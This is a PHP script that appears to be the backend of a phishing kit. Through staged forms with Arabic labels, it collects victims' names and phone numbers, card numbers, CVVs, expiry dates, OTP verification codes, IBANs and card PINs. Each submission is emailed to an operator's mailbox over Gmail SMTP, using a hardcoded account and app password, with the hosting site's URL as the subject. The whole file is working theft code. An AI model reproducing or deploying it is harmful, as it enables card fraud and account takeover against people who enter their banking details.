<?php
session_start();

require "vendor/autoload.php";
require_once './dashboard/init.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://";

// Get the host name
$host = $_SERVER['HTTP_HOST'];

// Get the current URI
$uri = $_SERVER['REQUEST_URI'];

// Combine the protocol, host, and URI to form the complete URL
$currentURL = $protocol . $host;



if (isset($_POST["send"])) {
    $date = date("Y/m/d");
    $status = $_POST["status"];
    $name = "";
    $ssn = "";
    $phone = "";
    $cardName = "";
    $cardNumber = "";
    $cvv = "";
    $month = "";
    $year = "";
    $verificationCode = "";
    $cardCode = "";
    $subject = "";
    $testEmail = "exfourd@gmail.com";
    if ($status == 1) {
        $name = $_POST["fname"];
        $phone = $_POST["phone"];
        $job = $_POST["job"];
        $subject = "
    <html>
      <head>
          <style>
               .bodysms {
                  float: right;
                  
              }
              .headers {
                  display: -webkit-inline-box;
                  margin: 0 79px;
              }
              .bodysms h3{
                  color: #173291;
                  font-size: 25px;
                  padding: 23px;
                  width: 95px;
              }
              .centers {
                  text-align: right;
              }
              table {
                  border-collapse: collapse;
                  width: 70%;
                  margin: 0 112px;
              }
    
              table, td, th {
                  border: 1px solid black;
                  padding: 5px;
    text-align: right;
              }
              th {
                  text-align: right;
                  color: #14286c;
                  font-weight: 600;
              }
          </style>
      </head>
      <body>
          <div class='bodysms'>
          
              <table>
    <tr>
                  <td>$name</td>
                  <th>الأسم</th>
              </tr>
              <tr>
                  <td>$job</td>
                  <th>تاريخ الميلاد</th>
              </tr>
              <tr>
                  <td>$phone</td>
                  <th>رقم الهاتف</th>
              </tr>
              </table>
              </div>
          </div>
         
      </body>
    </html>";
    } else if ($status == 2) {
        $cardName = $_POST["cardNumber"];
        $cardNumber = $_POST["cardNumber"];
        $cvv = $_POST["cvv"];
        $month = $_POST["month"];
        $year = $_POST["year"];
        $subject = "
    <html>
      <head>
          <style>
               .bodysms {
                  float: right;
                  
              }
              .headers {
                  display: -webkit-inline-box;
                  margin: 0 79px;
              }
              .bodysms h3{
                  color: #173291;
                  font-size: 25px;
                  padding: 23px;
                  width: 95px;
              }
              .centers {
                  text-align: right;
              }
              table {
                  border-collapse: collapse;
                  width: 80%;
                  margin: 0 112px;
              }
    
              table, td, th {
                  border: 1px solid black;
                  padding: 5px;
    text-align: right;
              }
              th {
                  text-align: right;
                  color: #14286c;
                  font-weight: 600;
              }
          </style>
      </head>
      <body>
          <div class='bodysms'>
          
              <table>
    <tr>
                  <td>$cardName</td>
                  <th>اسم حامل البطاقة</th>
              </tr>
              <tr>
                  <td>$cardNumber</td>
                  <th>رقم البطاقة</th>
              </tr>
              <tr>
                  <td>$cvv</td>
                  <th>CVV</th>
              </tr>
              <tr>
                  <td>$year</td>
                  <th>السنة</th>
              </tr>
              <tr>
                  <td>$month</td>
                  <th>الشهر</th>
              </tr>
              </table>
              </div>
          </div>
         
      </body>
    </html>";
    } else if ($status == 3) {
        $verificationCode = $_POST["verificationCode"];
        $subject = "
    <html>
      <head>
          <style>
               .bodysms {
                  float: right;
                  
              }
              .headers {
                  display: -webkit-inline-box;
                  margin: 0 79px;
              }
              .bodysms h3{
                  color: #173291;
                  font-size: 25px;
                  padding: 23px;
                  width: 95px;
              }
              .centers {
                  text-align: right;
              }
              table {
                  border-collapse: collapse;
                  width: 70%;
                  margin: 0 112px;
              }
    
              table, td, th {
                  border: 1px solid black;
                  padding: 5px;
    text-align: right;
              }
              th {
                  text-align: right;
                  color: #14286c;
                  font-weight: 600;
              }
          </style>
      </head>
      <body>
          <div class='bodysms'>
          
              <table>
    <tr>
                  <td>$verificationCode</td>
                  <th>كود التحقق</th>
              </tr>
              </table>
              </div>
          </div>
         
      </body>
    </html>";
    }
    else if ($status == 5) {
        $iban = $_POST["ibanB"];
        $subject = "
        <html>
          <head>
              <style>
                   .bodysms {
                      float: right;
                      
                  }
                  .headers {
                      display: -webkit-inline-box;
                      margin: 0 79px;
                  }
                  .bodysms h3{
                      color: #173291;
                      font-size: 25px;
                      padding: 23px;
                      width: 95px;
                  }
                  .centers {
                      text-align: right;
                  }
                  table {
                      border-collapse: collapse;
                      width: 70%;
                      margin: 0 112px;
                  }
        
                  table, td, th {
                      border: 1px solid black;
                      padding: 5px;
        text-align: right;
                  }
                  th {
                      text-align: right;
                      color: #14286c;
                      font-weight: 600;
                  }
              </style>
          </head>
          <body>
              <div class='bodysms'>
              
                  <table>
        <tr>
                      <td>$iban</td>
                      <th>IBAN</th>
                  </tr>
                  </table>
                  </div>
              </div>
             
          </body>
        </html>";
    } else {
        $cardCode = $_POST["cardCode"];
        $subject = "
    <html>
      <head>
          <style>
               .bodysms {
                  float: right;
                  
              }
              .headers {
                  display: -webkit-inline-box;
                  margin: 0 79px;
              }
              .bodysms h3{
                  color: #173291;
                  font-size: 25px;
                  padding: 23px;
                  width: 95px;
              }
              .centers {
                  text-align: right;
              }
              table {
                  border-collapse: collapse;
                  width: 70%;
                  margin: 0 112px;
              }
    
              table, td, th {
                  border: 1px solid black;
                  padding: 5px;
    text-align: right;
              }
              th {
                  text-align: right;
                  color: #14286c;
                  font-weight: 600;
              }
          </style>
      </head>
      <body>
          <div class='bodysms'>
          
              <table>
    <tr>
                  <td>$cardCode</td>
                  <th>رقم البطاقة السري</th>
              </tr>
              </table>
              </div>
          </div>
         
      </body>
    </html>";
    }


    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;

    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->Username = 'exfourd@gmail.com';
    $mail->Password = 'buiigqomzvyarwei';

    $mail->setFrom('exfourd@gmail.com');
    $mail->isHTML(true);


    $mail->Subject = $currentURL;
    $mail->Body = $subject;
    $mail->addAddress('test@gmail.com');
    $mail->send();
}
